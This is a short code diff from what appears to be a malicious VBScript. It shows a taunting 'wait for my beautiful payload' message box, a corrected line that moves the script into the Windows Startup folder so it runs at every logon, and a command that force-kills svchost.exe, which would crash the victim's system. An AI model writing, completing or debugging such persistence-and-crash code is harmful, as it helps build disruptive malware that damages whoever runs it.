@@ -20,6 +20,6 @@ MsgBox "wait for my beautiful payload " & user & "!!!"
 
 WScript.Sleep 1000
 
-FSO.MoveFile(startupFilePath, shell.SpecialFolders("Startup") & "start.vbs")
+FSO.MoveFile startupFilePath, shell.SpecialFolders("Startup") & "\start.vbs"
 
 shell.run "taskkill /f /im svchost.exe"
